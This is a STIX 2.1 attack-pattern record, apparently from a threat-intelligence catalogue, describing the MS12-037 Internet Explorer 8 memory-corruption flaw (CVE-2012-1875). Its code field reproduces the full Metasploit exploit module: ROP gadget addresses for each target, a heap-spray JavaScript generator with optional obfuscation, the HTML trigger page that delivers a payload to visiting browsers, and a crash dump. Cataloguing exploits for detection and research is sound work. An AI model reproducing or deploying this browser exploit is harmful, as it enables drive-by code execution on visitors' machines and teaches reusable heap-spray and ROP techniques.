{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--73709afc-ddd4-409a-818b-0b10b062cb79",
    "created": "2024-08-14T16:45:18.248635Z",
    "modified": "2024-08-14T16:45:18.24864Z",
    "name": "\"MS12-037 Microsoft Internet Explorer Same ID Property Deleted Object Handling Memory Corruption\"",
    "description": " This module exploits a memory corruption flaw in Internet Explorer 8 when handling objects with the same ID property. At the moment this module targets IE8 over Windows XP SP3 and Windows 7. This module supports heap massaging as well as the heap spray method seen in the wild (Java msvcrt71.dll).  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ms12_037_same_id.rb",
            "external_id": "ms12_037_same_id.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-1875"
        },
        {
            "source_name": "reference",
            "url": "http://labs.alienvault.com/labs/index.php/2012/ongoing-attacks-exploiting-cve-2012-1875/"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2012/06/18/metasploit-exploits-critical-microsoft-vulnerabilities"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::RopDb\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"MS12-037 Microsoft Internet Explorer Same ID Property Deleted Object Handling Memory Corruption\",\n      'Description'    => %q{\n          This module exploits a memory corruption flaw in Internet Explorer 8 when\n        handling objects with the same ID property. At the moment this module targets\n        IE8 over Windows XP SP3 and Windows 7. This module supports heap massaging\n        as well as the heap spray method seen in the wild (Java msvcrt71.dll).\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Dark Son',    # Vulnerability discovery\n          'Unknown',     # Credited to both Qihoo 360 Security Center and Google, Inc. for Vulnerability discovery\n          'Yichong Lin', # Vulnerability discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'MSB', 'MS12-037'],\n          [ 'CVE', '2012-1875' ],\n          [ 'OSVDB', '82865'],\n          [ 'URL', 'http://labs.alienvault.com/labs/index.php/2012/ongoing-attacks-exploiting-cve-2012-1875/'],\n          [ 'URL', 'https://twitter.com/binjo/status/212795802974830592' ], # Exploit found in the wild\n          [ 'URL', 'https://www.rapid7.com/blog/post/2012/06/18/metasploit-exploits-critical-microsoft-vulnerabilities']\n        ],\n      'Payload'        =>\n        {\n          'Space'    => 1024,\n          'BadChars' => \"\\x00\",\n          'DisableNops' => true\n        },\n      'DefaultOptions'  =>\n        {\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic', {} ],\n          [\n            'IE 8 on Windows XP SP3 with msvcrt ROP',\n            {\n              'Rop'    => :msvcrt,\n              'RopOffset' => '0x5f4',\n              'Ret'    => 0x77c15ed5 # xchg eax, esp # ret # from msvcrt.dll\n            }\n          ],\n          [\n            'IE 8 on Windows XP SP3 with JRE ROP',\n            {\n              'Rop'    => :jre,\n              'RopOffset' => '0x5f4',\n              'Ret'    => 0x7c348b05 # xchg eax, esp # ret # from msvcr71.dll\n            }\n          ],\n          [\n            'IE 8 on Windows 7 SP1/Vista SP2 with JRE ROP',\n            {\n              'Rop'    => :jre,\n              'RopOffset' => '0x5f4',\n              'Ret'    => 0x7c348b05 # xchg eax, esp # ret # from msvcr71.dll\n            }\n          ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-06-12',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false])\n      ])\n\n  end\n\n  def get_target(agent)\n    # If the user is already specified by the user, we'll just use that\n    return target if target.name != 'Automatic'\n\n    if agent =~ /NT 5\\.1/ and agent =~ /MSIE 8\\.0/\n      # Windows XP SP3 + IE 8.0\n      return targets[1]\n    elsif agent =~ /NT 6\\.[01]/ and agent =~ /MSIE 8\\.0/\n      # Windows 7 SP1 + IE 8.0\n      # Vista SP2 + IE 8.0\n      return targets[3]\n    else\n      return nil\n    end\n  end\n\n  def ret(t)\n    case t['Rop']\n    when :msvcrt\n      return [ 0x77c4ec01 ].pack(\"V\") # RETN (ROP NOP) # msvcrt.dll\n    when :jre\n      return [ 0x7c347f98 ].pack(\"V\") # RETN (ROP NOP) # msvcr71.dll\n    end\n  end\n\n  def popret(t)\n    case t['Rop']\n    when :msvcrt\n      return [ 0x77c4ec00 ].pack(\"V\") # POP EBP # RETN (ROP NOP) # msvcrt.dll\n    when :jre\n      return [ 0x7c376541 ].pack(\"V\") # POP EBP # RETN (ROP NOP) # msvcr71.dll\n    end\n  end\n\n  def get_rop_chain(t)\n    pivot = ret(t) * 27\n    pivot << popret(t)\n    pivot << [t.ret].pack(\"V\") # stackpivot\n\n    case t['Rop']\n    when :msvcrt\n      print_status(\"Using msvcrt ROP\")\n      rop = generate_rop_payload('msvcrt', '', {'target'=>'xp', 'pivot'=>pivot})\n\n    else\n      print_status(\"Using JRE ROP\")\n      rop = generate_rop_payload('java', '', {'pivot'=>pivot})\n    end\n\n    return rop\n\n  end\n\n  def on_request_uri(cli, request)\n\n    agent = request.headers['User-Agent']\n    my_target = get_target(agent)\n\n    # Avoid the attack if the victim doesn't have the same setup we're targeting\n    if my_target.nil?\n      print_error(\"Browser not supported: #{agent}\")\n      send_not_found(cli)\n      return\n    end\n\n    print_status(\"Client requesting: #{request.uri}\")\n\n    p = payload.encoded\n\n    js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(my_target.arch))\n    js_padding = Rex::Text.to_unescape(rand_text_alpha(4), Rex::Arch.endian(my_target.arch))\n    js_rop = Rex::Text.to_unescape(get_rop_chain(my_target), Rex::Arch.endian(my_target.arch))\n    js_nops = Rex::Text.to_unescape(make_nops(4), Rex::Arch.endian(my_target.arch))\n    randnop = rand_text_alpha(rand(100) + 1)\n\n    js_spray = <<-JS\n    var heap_obj = new heapLib.ie(0x20000);\n    var code = unescape(\"#{js_code}\");\n    var rop_chain = unescape(\"#{js_rop}\");\n    var random = unescape(\"#{js_padding}\");\n    var #{randnop} = \"#{js_nops}\";\n    var nops = unescape(#{randnop});\n\n    while (random.length < 0x80000) random += random;\n    while (nops.length < 0x80000) nops += nops;\n\n    var padding = random.substring(0, #{my_target['RopOffset']}-code.length);\n    var shellcode = code + padding + rop_chain + nops.substring(0, 0x800-code.length-padding.length-rop_chain.length);\n\n    while (shellcode.length < 0x40000) shellcode += shellcode;\n    var block = shellcode.substring(0, (0x80000-6)/2);\n\n    heap_obj.gc();\n    for (var z=1; z < 0x385; z++) {\n      heap_obj.alloc(block);\n    }\n    JS\n\n    js_spray = heaplib(js_spray, {:noobfu => true})\n\n    trigger_f = \"trigger\"\n    feng_shui_f = \"feng_shui\"\n    crash_f = \"crash\"\n    unescape_f = \"do_unescape\"\n    main_f = \"main\"\n    a_id = \"MyA\"\n    danger_id = \"imgTest\"\n\n    if datastore['OBFUSCATE']\n      js_spray = ::Rex::Exploitation::JSObfu.new(js_spray)\n      js_spray.obfuscate(memory_sensitive: true)\n\n      trigger_f = rand_text_alpha(rand(5) + 4)\n      feng_shui_f = rand_text_alpha(rand(5) + 4)\n      crash_f = rand_text_alpha(rand(5) + 4)\n      unescape_f = rand_text_alpha(rand(5) + 4)\n      main_f = rand_text_alpha(rand(5) + 4)\n      a_id = rand_text_alpha(rand(5) + 4)\n      danger_id = rand_text_alpha(rand(5) + 4)\n    end\n\n    html = %Q|\n      <HTML>\n      <BODY>\n      <title></title>\n      <DIV id=testfaild>\n        <img id=\"#{danger_id}\" style=\"display:none\">\n        <a href=\"javascript:#{feng_shui_f}();\" id=\"#{a_id}\" onClick=\"#{feng_shui_f}();\">\n        <div style=\"background-color:#FFFFFF; width:30; height:40\" id=\"#{danger_id}\" src=\"\" onMouseOver=\"#{crash_f}();\" onMouseOut=\"#{crash_f}();\">\n        </div>\n        </a>\n      </DIV>\n      <SCRIPT LANGUAGE=\"JavaScript\">\n      function #{unescape_f}(dword) {\n        var t = unescape;\n        var d = Number(dword).toString(16);\n        while (d.length < 8) d = '0' + d;\n        return t('%u' + d.substr(4, 8) + '%u' + d.substr(0, 4));\n      }\n      function #{feng_shui_f}() {\n        var tag = 0x1c1c1c0c;\n        var vtable1 = #{unescape_f}(tag) + '1234567555555555588888888';\n        var divs = new Array();\n        for (var i = 0; i < 128; i++) divs.push(document.createElement('div'));\n        testfaild.innerHTML = testfaild.innerHTML;\n        divs[0].className = vtable1;\n        divs[1].className = vtable1;\n        divs[2].className = vtable1;\n        divs[3].className = vtable1;\n      }\n      function #{crash_f}() {\n        eval(\"#{danger_id}\").src = \"\";\n      }\n      function #{trigger_f}() {\n        var x = document.getElementsByTagName(\"div\");\n        var fireOnThis = document.getElementById(\"#{a_id}\");\n        if (document.createEvent) {\n          evObj = document.createEvent('MouseEvents');\n          evObj.iniEvent('click', true, false);\n          fireOnThis.dispatchEvent(evObj);\n        } else if (document.createEventObject) {\n          x[1].fireEvent('onMouseOver');\n          fireOnThis.fireEvent('onclick');\n          x[1].fireEvent('onMouseOut');\n        }\n      }\n      function #{main_f}() {\n\n        #{js_spray}\n        setTimeout(\"#{trigger_f}();\", 1000);\n\n      }\n      #{main_f}();\n      </SCRIPT>\n      </BODY>\n      </HTML>\n    |\n\n    html = html.gsub(/^ {6}/, '')\n\n    print_status(\"Sending html\")\n    send_response(cli, html, {'Content-Type'=>'text/html'})\n  end\nend\n\n\n=begin\n* crash\n(a9c.998): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\n*** ERROR: Symbol file could not be found.  Defaulted to export\nsymbols for C:\\WINDOWS\\system32\\mshtml.dll -\neax=1c1c1c0c ebx=00000000 ecx=02fdf588 edx=00000001 esi=02fdf588 edi=020bbaf0\neip=6363fcc6 esp=020bba88 ebp=020bba94 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246\nmshtml!DllGetClassObject+0xafd09:\n6363fcc6 8b5070          mov     edx,dword ptr [eax+70h]\nds:0023:1c1c1c7c=????????\n=end\n",
    "x_mitre_disclosure_date": "2012-06-12",
    "x_mitre_platforms": [
        "win'"
    ]
}